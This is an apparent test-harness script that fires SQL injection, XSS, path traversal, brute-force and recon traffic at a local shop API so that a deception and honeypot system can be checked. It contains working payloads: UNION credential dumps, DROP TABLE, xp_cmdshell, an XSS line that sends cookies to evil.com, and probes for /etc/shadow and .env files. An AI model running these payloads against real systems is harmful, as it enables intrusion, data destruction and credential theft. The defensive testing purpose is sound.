#!/usr/bin/env python3
import argparse
import random
import string
import sys
import threading
import time
import uuid

import requests
from colorama import Fore, Style, init

init(autoreset=True)

DEFAULT_TARGET = "http://localhost:30080"


def log_attack(label, color, msg):
    ts = time.strftime("%H:%M:%S")
    print(f"{color}[{ts}] [{label}] {msg}{Style.RESET_ALL}")


def log_result(resp, label, color):
    try:
        status = resp.status_code
        length = len(resp.content)
        node = resp.headers.get("X-Service-Node", "unknown")
        log_attack(label, color, f"  -> {status} ({length}B) node={node}")
    except Exception as e:
        log_attack(label, color, f"  -> Error: {e}")


class SQLInjectionAttack:
    LABEL = "SQLi"
    COLOR = Fore.RED
    ATTACKER_IP = "192.168.1.66"

    PAYLOADS_URL = [
        "1' OR '1'='1",
        "1' OR '1'='1'--",
        "1' OR '1'='1'/*",
        "1 UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT username,password,NULL FROM users--",
        "1; DROP TABLE products;--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1'; EXEC xp_cmdshell('whoami');--",
        "1' AND 1=1 UNION SELECT table_name,NULL FROM information_schema.tables--",
        "1' OR 1=1#",
    ]

    PAYLOADS_BODY = [
        {"username": "admin' OR '1'='1'--", "password": "anything"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "'; DROP TABLE users;--", "password": "test"},
        {"email": "test@test.com' UNION SELECT * FROM users--"},
        {"search": "' UNION SELECT credit_card,NULL FROM orders--"},
        {"id": "1; INSERT INTO users(username,password) VALUES('hacker','hacked')"},
    ]

    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            "X-Forwarded-For": self.ATTACKER_IP,
            "X-Attacker-IP": self.ATTACKER_IP,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })

    def run(self):
        log_attack(self.LABEL, self.COLOR, f"Starting SQL injection attack from {self.ATTACKER_IP}")
        sent = 0

        log_attack(self.LABEL, self.COLOR, "Phase 1: URL parameter injection")
        for payload in self.PAYLOADS_URL:
            try:
                resp = self.session.get(
                    f"{self.target}/api/products",
                    params={"id": payload},
                    timeout=10,
                )
                log_attack(self.LABEL, self.COLOR, f"  GET /api/products?id={payload[:60]}")
                log_result(resp, self.LABEL, self.COLOR)
                sent += 1
            except requests.RequestException as e:
                log_attack(self.LABEL, self.COLOR, f"  Connection error: {e}")
            time.sleep(0.3)

        log_attack(self.LABEL, self.COLOR, "Phase 2: POST body injection")
        for payload in self.PAYLOADS_BODY:
            try:
                resp = self.session.post(
                    f"{self.target}/api/cart/add",
                    json=payload,
                    timeout=10,
                )
                log_attack(self.LABEL, self.COLOR, f"  POST /api/cart/add body={payload}")
                log_result(resp, self.LABEL, self.COLOR)
                sent += 1
            except requests.RequestException as e:
                log_attack(self.LABEL, self.COLOR, f"  Connection error: {e}")
            time.sleep(0.3)

        log_attack(self.LABEL, self.COLOR, f"Complete: {sent} payloads sent")
        print()
        print(f"{self.COLOR}{'='*60}")
        print(f"  SQLi Attack Summary")
        print(f"  Payloads sent: {sent}")
        print(f"  Attacker IP: {self.ATTACKER_IP}")
        print(f"  Expected: traffic-analyzer detects SQLi patterns,")
        print(f"  deception-controller spawns decoy set,")
        print(f"  future requests from {self.ATTACKER_IP} routed to decoy")
        print(f"{'='*60}{Style.RESET_ALL}")
        print()


class XSSAttack:
    LABEL = "XSS"
    COLOR = Fore.YELLOW
    ATTACKER_IP = "192.168.1.77"

    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "'\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "<iframe src='javascript:alert(1)'>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<svg><script>alert(1)</script></svg>",
        "data:text/html,<script>alert(1)</script>",
    ]

    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            "X-Forwarded-For": self.ATTACKER_IP,
            "X-Attacker-IP": self.ATTACKER_IP,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        })

    def run(self):
        log_attack(self.LABEL, self.COLOR, f"Starting XSS attack from {self.ATTACKER_IP}")
        sent = 0

        for payload in self.PAYLOADS:
            try:
                resp = self.session.get(
                    f"{self.target}/api/products",
                    params={"search": payload},
                    timeout=10,
                )
                log_attack(self.LABEL, self.COLOR, f"  GET /api/products?search={payload[:50]}")
                log_result(resp, self.LABEL, self.COLOR)
                sent += 1
            except requests.RequestException as e:
                log_attack(self.LABEL, self.COLOR, f"  Connection error: {e}")
            time.sleep(0.3)

            try:
                resp = self.session.post(
                    f"{self.target}/api/cart/add",
                    json={"session_id": "xss-test", "product_id": 1, "quantity": 1, "name": payload},
                    timeout=10,
                )
                log_attack(self.LABEL, self.COLOR, f"  POST /api/cart/add name={payload[:50]}")
                log_result(resp, self.LABEL, self.COLOR)
                sent += 1
            except requests.RequestException as e:
                log_attack(self.LABEL, self.COLOR, f"  Connection error: {e}")
            time.sleep(0.2)

        log_attack(self.LABEL, self.COLOR, f"Complete: {sent} payloads sent")
        print()
        print(f"{self.COLOR}{'='*60}")
        print(f"  XSS Attack Summary")
        print(f"  Payloads sent: {sent}")
        print(f"  Attacker IP: {self.ATTACKER_IP}")
        print(f"  Expected: traffic-analyzer detects XSS patterns,")
        print(f"  decoy spawned, attacker redirected to honeypot")
        print(f"{'='*60}{Style.RESET_ALL}")
        print()


class DirectoryTraversal:
    LABEL = "DirTrav"
    COLOR = Fore.MAGENTA
    ATTACKER_IP = "192.168.1.88"

    PATHS = [
        "/../../../etc/passwd",
        "/../../../etc/shadow",
        "/../../../etc/hosts",
        "/../../../proc/self/environ",
        "/../../../windows/system32/config/sam",
        "/.env",
        "/.git/config",
        "/.git/HEAD",
        "/.gitignore",
        "/admin",
        "/admin/login",
        "/wp-login.php",
        "/wp-admin",
        "/phpmyadmin",
        "/server-status",
        "/server-info",
        "/.htaccess",
        "/.htpasswd",
        "/config.php",
        "/backup.sql",
        "/database.sql",
        "/debug",
        "/actuator",
        "/actuator/env",
        "/swagger-ui.html",
        "/api-docs",
        "/graphql",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/..%252f..%252f..%252fetc/passwd",
    ]

    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            "X-Forwarded-For": self.ATTACKER_IP,
            "X-Attacker-IP": self.ATTACKER_IP,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })

    def run(self):
        log_attack(self.LABEL, self.COLOR, f"Starting directory traversal from {self.ATTACKER_IP}")
        sent = 0

        for path in self.PATHS:
            try:
                resp = self.session.get(
                    f"{self.target}{path}",
                    timeout=10,
                    allow_redirects=False,
                )
                log_attack(self.LABEL, self.COLOR, f"  GET {path}")
                log_result(resp, self.LABEL, self.COLOR)
                sent += 1
            except requests.RequestException as e:
                log_attack(self.LABEL, self.COLOR, f"  Connection error: {e}")
            time.sleep(0.2)

        log_attack(self.LABEL, self.COLOR, f"Complete: {sent} paths probed")
        print()
        print(f"{self.COLOR}{'='*60}")
        print(f"  Directory Traversal Summary")
        print(f"  Paths probed: {sent}")
        print(f"  Attacker IP: {self.ATTACKER_IP}")
        print(f"  Expected: path traversal + dir enum detection,")
        print(f"  sensitive path access triggers decoy deployment")
        print(f"{'='*60}{Style.RESET_ALL}")
        print()


class BruteForce:
    LABEL = "Brute"
    COLOR = Fore.CYAN
    ATTACKER_IP = "192.168.1.99"

    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            "X-Forwarded-For": self.ATTACKER_IP,
            "X-Attacker-IP": self.ATTACKER_IP,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })

    def run(self):
        log_attack(self.LABEL, self.COLOR, f"Starting brute force from {self.ATTACKER_IP}")
        log_attack(self.LABEL, self.COLOR, "Sending 20 requests in 5 seconds")
        sent = 0

        endpoints = [
            "/api/cart/{sid}/checkout",
            "/login",
            "/auth",
            "/api/auth/login",
        ]

        start = time.time()
        for i in range(20):
            sid = "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
            endpoint = endpoints[i % len(endpoints)].format(sid=sid)
            payload = {
                "username": f"admin",
                "password": f"password{i:03d}",
                "session_id": sid,
            }
            try:
                resp = self.session.post(
                    f"{self.target}{endpoint}",
                    json=payload,
                    timeout=10,
                )
                log_attack(self.LABEL, self.COLOR, f"  POST {endpoint} attempt #{i+1}")
                log_result(resp, self.LABEL, self.COLOR)
                sent += 1
            except requests.RequestException as e:
                log_attack(self.LABEL, self.COLOR, f"  Connection error: {e}")
            time.sleep(0.25)

        elapsed = time.time() - start
        log_attack(self.LABEL, self.COLOR, f"Complete: {sent} requests in {elapsed:.1f}s")
        print()
        print(f"{self.COLOR}{'='*60}")
        print(f"  Brute Force Summary")
        print(f"  Requests sent: {sent} in {elapsed:.1f}s")
        print(f"  Rate: {sent/max(elapsed,0.1):.1f} req/s")
        print(f"  Attacker IP: {self.ATTACKER_IP}")
        print(f"  Expected: rate limiting triggers first,")
        print(f"  brute force detection spawns decoy")
        print(f"{'='*60}{Style.RESET_ALL}")
        print()


class ReconScanner:
    LABEL = "Recon"
    COLOR = Fore.BLUE
    ATTACKER_IP = "192.168.1.55"

    PATHS = [
        "/", "/index.html", "/index.php", "/default.asp",
        "/admin", "/administrator", "/admin.php", "/admin/login",
        "/login", "/signin", "/auth", "/oauth",
        "/api", "/api/v1", "/api/v2", "/api/swagger",
        "/wp-login.php", "/wp-admin", "/wp-content", "/wp-includes",
        "/phpmyadmin", "/pma", "/mysql", "/adminer",
        "/console", "/shell", "/cmd", "/terminal",
        "/backup", "/dump", "/db", "/database",
        "/.git", "/.svn", "/.hg", "/.env",
        "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
        "/server-status", "/server-info", "/status",
    ]

    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            "X-Forwarded-For": self.ATTACKER_IP,
            "X-Attacker-IP": self.ATTACKER_IP,
            "User-Agent": "sqlmap/1.5",
        })

    def run(self):
        log_attack(self.LABEL, self.COLOR, f"Starting recon scan from {self.ATTACKER_IP}")
        log_attack(self.LABEL, self.COLOR, f"User-Agent: sqlmap/1.5 — scanning {len(self.PATHS)} paths")
        sent = 0

        for path in self.PATHS:
            try:
                resp = self.session.get(
                    f"{self.target}{path}",
                    timeout=5,
                    allow_redirects=False,
                )
                status = resp.status_code
                marker = "!" if status == 200 else " "
                log_attack(self.LABEL, self.COLOR, f"  {marker} {status} {path}")
                sent += 1
            except requests.RequestException:
                log_attack(self.LABEL, self.COLOR, f"  x ERR {path}")
            time.sleep(0.1)

        log_attack(self.LABEL, self.COLOR, f"Complete: {sent} paths scanned")
        print()
        print(f"{self.COLOR}{'='*60}")
        print(f"  Recon Scanner Summary")
        print(f"  Paths scanned: {sent}")
        print(f"  Attacker IP: {self.ATTACKER_IP}")
        print(f"  User-Agent: sqlmap/1.5")
        print(f"  Expected: scanner UA detected immediately,")
        print(f"  rapid path enumeration confirms recon behavior")
        print(f"{'='*60}{Style.RESET_ALL}")
        print()


class LegitimateUser:
    LABEL = "Legit"
    COLOR = Fore.GREEN
    USER_IP = "10.0.0.50"

    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            "X-Forwarded-For": self.USER_IP,
            "X-Attacker-IP": self.USER_IP,
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        })
        self.session_id = str(uuid.uuid4()).replace("-", "")[:16]

    def run(self, continuous=False):
        log_attack(self.LABEL, self.COLOR, f"Starting legitimate browsing from {self.USER_IP}")
        while True:
            self._browse_cycle()
            if not continuous:
                break
            time.sleep(random.uniform(5, 10))

    def _browse_cycle(self):
        try:
            log_attack(self.LABEL, self.COLOR, "Browsing products...")
            resp = self.session.get(f"{self.target}/api/products", timeout=10)
            log_result(resp, self.LABEL, self.COLOR)
            time.sleep(random.uniform(1, 3))

            log_attack(self.LABEL, self.COLOR, "Viewing product details...")
            for pid in random.sample(range(1, 13), 3):
                resp = self.session.get(f"{self.target}/api/products/{pid}", timeout=10)
                log_result(resp, self.LABEL, self.COLOR)
                time.sleep(random.uniform(1, 2))

            log_attack(self.LABEL, self.COLOR, "Browsing by category...")
            for cat in random.sample(["electronics", "clothing", "books"], 2):
                resp = self.session.get(f"{self.target}/api/products/category/{cat}", timeout=10)
                log_result(resp, self.LABEL, self.COLOR)
                time.sleep(random.uniform(1, 3))

            log_attack(self.LABEL, self.COLOR, "Adding items to cart...")
            for pid in random.sample(range(1, 13), 2):
                resp = self.session.post(
                    f"{self.target}/api/cart/add",
                    json={"session_id": self.session_id, "product_id": pid, "quantity": 1},
                    timeout=10,
                )
                log_result(resp, self.LABEL, self.COLOR)
                time.sleep(random.uniform(1, 2))

            log_attack(self.LABEL, self.COLOR, "Viewing cart...")
            resp = self.session.get(f"{self.target}/api/cart/{self.session_id}", timeout=10)
            log_result(resp, self.LABEL, self.COLOR)
            time.sleep(random.uniform(2, 3))

            log_attack(self.LABEL, self.COLOR, "Checking out...")
            resp = self.session.post(
                f"{self.target}/api/cart/{self.session_id}/checkout",
                json={"session_id": self.session_id},
                timeout=10,
            )
            log_result(resp, self.LABEL, self.COLOR)
            self.session_id = str(uuid.uuid4()).replace("-", "")[:16]

        except requests.RequestException as e:
            log_attack(self.LABEL, self.COLOR, f"  Connection error: {e}")


ATTACK_CLASSES = {
    "sqli": SQLInjectionAttack,
    "xss": XSSAttack,
    "traversal": DirectoryTraversal,
    "bruteforce": BruteForce,
    "recon": ReconScanner,
    "legitimate": LegitimateUser,
}


def run_all(target, delay):
    print(f"\n{Fore.WHITE}{Style.BRIGHT}{'='*60}")
    print(f"  DECEPTION SYSTEM — Full Attack Simulation")
    print(f"  Target: {target}")
    print(f"  Delay between waves: {delay}s")
    print(f"{'='*60}{Style.RESET_ALL}\n")

    legit = LegitimateUser(target)
    legit_thread = threading.Thread(target=legit.run, kwargs={"continuous": True}, daemon=True)
    legit_thread.start()
    log_attack("Main", Fore.WHITE, "Legitimate user traffic running in background")
    time.sleep(3)

    attack_sequence = [
        ("sqli", SQLInjectionAttack),
        ("xss", XSSAttack),
        ("recon", ReconScanner),
        ("bruteforce", BruteForce),
        ("traversal", DirectoryTraversal),
    ]

    for name, cls in attack_sequence:
        print(f"\n{Fore.WHITE}{Style.BRIGHT}--- Launching {name.upper()} attack wave ---{Style.RESET_ALL}\n")
        attacker = cls(target)
        attacker.run()
        log_attack("Main", Fore.WHITE, f"Waiting {delay}s before next wave...")
        time.sleep(delay)

    print(f"\n{Fore.WHITE}{Style.BRIGHT}{'='*60}")
    print(f"  All attack waves complete!")
    print(f"  Legitimate traffic continues in background")
    print(f"  Check dashboard at http://localhost:30088")
    print(f"{'='*60}{Style.RESET_ALL}\n")


def main():
    parser = argparse.ArgumentParser(
        description="Deception System Attack Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack types:
  sqli        SQL injection (IP: 192.168.1.66)
  xss         Cross-site scripting (IP: 192.168.1.77)
  traversal   Directory traversal (IP: 192.168.1.88)
  bruteforce  Brute force login (IP: 192.168.1.99)
  recon       Reconnaissance scanner (IP: 192.168.1.55)
  legitimate  Normal user behavior (IP: 10.0.0.50)
  all         Run all attacks sequentially with legitimate background traffic
        """,
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--attack-type",
        choices=["sqli", "xss", "traversal", "bruteforce", "recon", "legitimate", "all"],
        default="all",
        help="Attack type to simulate (default: all)",
    )
    parser.add_argument(
        "--delay",
        type=int,
        default=10,
        help="Seconds between attack waves (default: 10)",
    )
    parser.add_argument(
        "--continuous",
        action="store_true",
        help="Keep running in a loop",
    )

    args = parser.parse_args()

    print(f"\n{Fore.WHITE}{Style.BRIGHT}")
    print(r"   ___  ____  ___ ___ ___ _____ ___ ___  _  _")
    print(r"  |   \| ___// __| __| _ \_   _|_ _/ _ \| \| |")
    print(r"  | |) | _|| (__ | _||  _/ | |  | | (_) | .` |")
    print(r"  |___/|___|\___||___|_|   |_| |___\___/|_|\_|")
    print(r"       Attack Simulator v1.0")
    print(f"{Style.RESET_ALL}")

    if args.attack_type == "all":
        if args.continuous:
            while True:
                run_all(args.target, args.delay)
                log_attack("Main", Fore.WHITE, f"Cycle complete. Restarting in {args.delay}s...")
                time.sleep(args.delay)
        else:
            run_all(args.target, args.delay)
    elif args.attack_type == "legitimate":
        attacker = LegitimateUser(args.target)
        attacker.run(continuous=args.continuous)
    else:
        cls = ATTACK_CLASSES[args.attack_type]
        if args.continuous:
            while True:
                attacker = cls(args.target)
                attacker.run()
                log_attack("Main", Fore.WHITE, f"Repeating in {args.delay}s...")
                time.sleep(args.delay)
        else:
            attacker = cls(args.target)
            attacker.run()


if __name__ == "__main__":
    main()
